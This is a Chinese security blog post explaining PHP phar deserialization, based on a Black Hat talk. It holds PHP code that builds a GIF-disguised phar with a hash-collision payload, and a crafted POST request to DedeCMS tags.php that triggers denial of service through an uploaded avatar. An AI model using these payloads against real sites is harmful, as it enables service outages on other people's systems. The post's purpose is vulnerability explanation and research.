> 原文链接: https://www.anquanke.com//post/id/157439 


# Blackhat议题解读 | phar反序列化


                                阅读量   
                                **188525**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t018c9ed442b5bc2cad.png)](https://p2.ssl.qhimg.com/t018c9ed442b5bc2cad.png)

> 本文来自 ChaMd5安全团队审计组 呆哥，文章内容以思路为主。

## 引言

## 漏洞原理

跟进PHP内核可以看到，当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。



## 漏洞利用

```
&lt;?php<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">set_time_limit(0);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$size= pow(2, 16);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$array = **array**();<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">**for **($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) `{`<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">    $array[$key] = 0;<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$new_obj = **new **stdClass;<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$new_obj-&gt;hacker = $array;<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$p = **new **Phar(**__DIR__ **. '/avatar.phar', 0);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$p['hacker.php'] = '&lt;?php ?&gt;';<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$p-&gt;setMetadata($new_obj);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$p-&gt;setStub('GIF&lt;?php __HALT_COMPILER();?&gt;');<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">
```

```
**&lt;?php<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">**set_time_limit(0);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$startTime = microtime(**true**);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">file_exists("[phar://avatar.phar](phar://avatar.phar)");<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">$endTime = microtime(**true**);<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">**echo **'执行时间：  '.($endTime - $startTime). ' 秒'; <br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">
```



## 漏洞实例复现

这里我要利用DedeCMS一个很出名的漏洞点，这个漏洞最初被用于探测后台目录，之后在“巅峰极客”比赛中被当做SSRF攻击利用，现在我要利用这个漏洞点构造phar反序列化来产生拒绝服务攻击！

首先通过织梦的头像上传点来上传phar文件（avatar.jpg）

文件位置：** /member/edit_face.php**

由于DedeCMS默认的上传文件大小被限制为50K，所以我们要修改一下配置文件：

**找到\data\config.cache.inc.php，**

**把$cfg_max_face修改为5000**



上传成功后就会显示出文件的相对路径，然后直接构造如下数据包即可验证漏洞：

```
POST /uploads/tags.php HTTP/1.1<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">Host: 127.0.0.1<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">Content-Type: application/x-www-form-urlencode<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">Content-Length: 136    <br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;"><br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">dopost=save&amp;_FILES[lsa][tmp_name]=[phar://uploads/userup/3/myface.jpg](phar://uploads/userup/3/myface.jpg)&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif<br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; overflow-wrap: break-word;">
```



## 参考

**[1]**[https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/](https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/)

**[2]**[http://php.net/manual/en/book.phar.php](http://php.net/manual/en/book.phar.php)

**[3]**[https://blog.ripstech.com/2018/new-php-exploitation-technique/](https://blog.ripstech.com/2018/new-php-exploitation-technique/)

**[4]**[http://www.laruence.com/2011/12/30/2435.html](http://www.laruence.com/2011/12/30/2435.html)

**[5]**[https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It’s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
